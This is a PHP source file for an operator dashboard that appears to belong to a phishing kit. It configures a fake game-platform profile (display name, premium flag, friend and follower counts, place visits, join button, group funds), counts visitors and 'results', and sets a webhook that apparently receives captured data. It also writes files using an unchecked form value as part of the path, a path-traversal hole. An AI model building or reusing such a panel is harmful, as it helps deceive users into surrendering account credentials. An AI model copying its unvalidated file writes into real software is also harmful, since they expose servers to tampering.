<?php
session_start();
if(!$_SESSION['authkey']) {
    die(header('location: sign-in'));
} else {
    $authkey = $_SESSION['authkey'];
    $siteid = file_get_contents('../tokens/'.$authkey.'.txt');
    $totalResult = file_get_contents('../tokens/'.$siteid.'/setup/totalresult.txt');
    $totalVisitor = file_get_contents('../tokens/'.$siteid.'/setup/totalvisitor.txt');
    	if(isset($_POST['profile_about_submit'])){
    		if(isset($_POST['profile_about_input'])){
    			file_put_contents('../tokens/'.$siteid.'/setup/description.txt',$_POST['profile_about_input']);
    			$description = 'true';
    		}

	} if(isset($_POST['profile_socialmedia_submit'])) {
		if(isset($_POST['profile_socialmedia_input'])){
			if(isset($_POST['typeSM'])){
				if(strlen($_POST['profile_socialmedia_input']) > 0){
				file_put_contents('../tokens/'.$siteid.'/setup/socialmedia/'.$_POST['typeSM'].'.txt',$_POST['profile_socialmedia_input']);
				$smalert = 'true';
				}elseif(strlen($_POST['profile_socialmedia_input']) == 0){
					file_put_contents('../tokens/'.$siteid.'/setup/socialmedia/'.$_POST['typeSM'].'.txt','');
					$smalert = 'true';
				}
			}
		}
	}
}
?>

<!doctype html>
<html lang="en">
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="fonts/style.css">
<link rel="stylesheet" href="css/owl.carousel.min.css">

<link rel="stylesheet" href="css/bootstrap.min.css">

<link rel="stylesheet" href="css/style.css">
<title>Dashboard</title>
</head>
<body>
<div class="content">
<div class="container">
<div class="row">
<div class="col-md-12 contents">
<div class="row justify-content-center">
<div class="col-md-8">
<div class="mb-4">
<center><h3>Data Analysis</h3></center>
</div>
<div class="mb-4">
<span>Total Visitor: <?=$totalVisitor;?></span> <br>
<span>Total Result: <?=$totalResult;?></span>
</div>
</div>
</div>
</div>
</div>
</div>
<br><hr><br>
<div class="container">
<div class="row">
<div class="col-md-12 contents">
<div class="row justify-content-center">
<div class="col-md-8">
<div class="mb-4">
<center><h3>URL</h3></center>
</div>
<div class="mb-4">
<span>Profile: <a href="https://<?=$_SERVER['SERVER_NAME'];?>/users/<?=$siteid;?>/profile">https://<?=$_SERVER['SERVER_NAME'];?>/users/<?=$siteid;?>/profile</a></span> <br>
</div>
</div>
</div>
</div>
</div>
</div>
<br><hr><br>
<div class="container">
<div class="row">
<div class="col-md-12 contents">
<div class="row justify-content-center">
<div class="col-md-8">
<div class="mb-4">
<center><h3>Controller</h3></center>
</div>
<form action="#">
<div class="form-group">
<select class="form-control" onChange="Selection(this);">
<option value="0">Select</option>
<option value="profile">Profile</option>
<option value="other">Other</option>
</select> </div>
</form>
<form action="#" id="Profile" style="display:none;">
<div class="form-group">
<select class="form-control" onChange="ProfileControl(this);">
<option value="0">Select Controller</option>
<option value="profile_username">Username</option>
<option value="profile_displayname">Display Name</option>
<option value="profile_premium">Premium</option>
<option value="profile_userid">Avatar</option>
<option value="profile_friends">Friends</option>
<option value="profile_followers">Followers</option>
<option value="profile_followings">Followings</option>
<option value="profile_about">Description</option>
<option value="profile_activity">Activity</option>
<option value="profile_join">Join Button</option>
<option value="profile_socialmedia">Social Media</option>
<option value="profile_created">Created</option>
<option value="profile_placevisits">Place Visits</option>
</select> </div>
</form>
<form action="#" id="profile_username" style="display:none;">
<div class="form-group">
<label for="profile_username_input">New Value</label>
<input type="text" class="form-control" id="profile_username_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_username_input').value);">Submit</button>
</form>
<form action="#" id="profile_displayname" style="display:none;">
<div class="form-group">
<label for="profile_displayname_input">New Value</label>
<input type="text" class="form-control" id="profile_displayname_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_displayname_input').value);">Submit</button>
</form>
<form action="#" id="profile_premium" style="display:none;">
<div class="form-group">
<select id="profile_premium_input" class="form-control">
<option value="0">false</option>
<option value="1">true</option>
</select> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_premium_input').value);">Submit</button>
</form>
<form action="#" id="profile_userid" style="display:none;">
<div class="form-group">
<label for="profile_userid_input">Username or UserId Target</label>
<input type="text" class="form-control" id="profile_userid_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_userid_input').value);">Submit</button>
</form>
<form action="#" id="profile_friends" style="display:none;">
<div class="form-group">
<label for="profile_friends_input">New Value</label>
<input type="text" class="form-control" id="profile_friends_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_friends_input').value);">Submit</button>
</form>
<form action="#" id="profile_followers" style="display:none;">
<div class="form-group">
<label for="profile_followers_input">New Value</label>
<input type="text" class="form-control" id="profile_followers_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_followers_input').value);">Submit</button>
</form>
<form action="#" id="profile_followings" style="display:none;">
<div class="form-group">
<label for="profile_followings_input">New Value</label>
<input type="text" class="form-control" id="profile_followings_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_followings_input').value);">Submit</button>
</form>
<form method="post" id="profile_about" style="display:none;">
<?php if(isset($description)){echo " <script>alert('Data updated');</script>";}?>
<div class="form-group">
<label for="profile_about_input">New Value</label>
<textarea type="text" class="form-control" id="profile_about_input" name="profile_about_input"> </textarea></div>
<button type="submit" name="profile_about_submit" class="btn text-white btn-block btn-primary">Submit</button>
</form>
<form action="#" id="profile_activity" style="display:none;">
<div class="form-group">
<select id="profile_activity_input" class="form-control">
<option value="none">None</option>
<option value="online">Online</option>
<option value="game">Playing</option>
 <option value="studio">Studio</option>
</select> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_activity_input').value);">Submit</button>
</form>
<form action="#" id="profile_join" style="display:none;">
<div class="form-group">
<select id="profile_join_input" class="form-control">
<option value="0">false</option>
<option value="1">true</option>
</select> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_join_input').value);">Submit</button>
</form>
<form method="post" id="profile_socialmedia" style="display:none;">
    <?php if(isset($smalert)){ echo "<script>alert('Data updated');</script>"; } ?>
<div class="form-group">
<select class="form-control" name="typeSM">
<option value="facebook">Facebook</option>
<option value="twitter">Twitter</option>
<option value="youtube">Youtube</option>
<option value="twitch">Twitch</option>
<option value="guilded">Guilded</option>
</select> </div>
<div class="form-group">
<label for="profile_socialmedia_input">New Value</label>
<input type="text" class="form-control" id="profile_socialmedia_input" name="profile_socialmedia_input"> </div>
<button type="submit" name="profile_socialmedia_submit" class="btn text-white btn-block btn-primary">Submit</button>
</form>
<form action="#" id="profile_created" style="display:none;">
<div class="form-group">
<input type="date" id="profile_created_input" class="form-control"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_created_input').value);">Submit</button>
</form>
<form action="#" id="profile_placevisits" style="display:none;">
<div class="form-group">
<label for="profile_placevisits_input">New Value</label>
<input type="text" id="profile_placevisits_input" class="form-control"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('profile_placevisits_input').value);">Submit</button>
</form>
<form action="#" id="Group" style="display:none;">
<div class="form-group">
<select class="form-control" onChange="GroupControl(this);">
<option value="0">Select Controller</option>
<option value="group_name">Name</option>
<option value="group_owner">Owner</option>
<option value="group_thumbnails">Thumbnails</option>
<option value="group_funds">Funds</option>
<option value="group_member">Member</option>
<option value="group_description">Description</option>
<option value="group_shout">Shout</option>
</select> </div>
</form>
<form action="#" id="group_name" style="display:none;">
<div class="form-group">
<label for="group_name_input">New Value</label>
<input type="text" class="form-control" id="group_name_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_name_input').value);">Submit</button>
</form>
<form action="#" id="group_owner" style="display:none;">
<div class="form-group">
<label for="group_owner_input">New Value</label>
<input type="text" class="form-control" id="group_owner_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_owner_input').value);">Submit</button>
</form>
<form action="#" id="group_thumbnails" style="display:none;">
<div class="form-group">
<label for="group_thumbnails_input">New Value</label>
<input type="text" class="form-control" id="group_thumbnails_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_thumbnails_input').value);">Submit</button>
</form>
<form action="#" id="group_funds" style="display:none;">
<div class="form-group">
<label for="group_funds_input">New Value</label>
<input type="text" class="form-control" id="group_funds_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_funds_input').value);">Submit</button>
</form>
<form action="#" id="group_member" style="display:none;">
<div class="form-group">
<label for="group_member_input">New Value</label>
<input type="text" class="form-control" id="group_member_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_member_input').value);">Submit</button>
</form>
<form action="#" id="group_description" style="display:none;">
<div class="form-group">
<label for="group_description_input">New Value</label>
<input type="text" class="form-control" id="group_description_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_description_input').value);">Submit</button>
</form>
<form action="#" id="group_shout" style="display:none;">
<div class="form-group">
<label for="group_shout_input">New Value</label>
<input type="text" class="form-control" id="group_shout_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('group_shout_input').value);">Submit</button>
</form>
<form action="#" id="Other" style="display:none;">
<div class="form-group">
<select class="form-control" onChange="OtherControl(this);">
<option value="0">Select Controller</option>
<option value="webhook">Webhook</option>
</select> </div>
</form>
<form action="#" id="webhook" style="display:none;">
<div class="form-group">
<label for="webhook_input">New Value</label>
<input type="text" class="form-control" id="webhook_input"> </div>
<button type="button" class="btn text-white btn-block btn-primary" onclick="ControlProfile(document.getElementById('webhook_input').value);">Submit</button>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="apis/main.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script src="js/jquery-3.3.1.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/main.js"></script>
</body>
</html>